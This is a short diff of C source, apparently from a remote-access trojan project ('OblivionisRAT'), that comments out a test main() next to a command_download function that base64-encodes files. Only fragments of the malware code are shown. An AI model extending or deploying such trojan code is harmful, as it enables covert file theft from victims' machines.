@@ -82,7 +82,7 @@ char *command_download(char *args, int argsLen, int *msgLen) {
     free(base64);
     return buffer;
 }
-
+/*
 int main() {
     int len;
     char *path = (char *)"E:\\OblivionisRAT\\trojan";
@@ -91,4 +91,4 @@ int main() {
         printf("%c", msg[i]);
     }
     return 0;
-}
+}*/
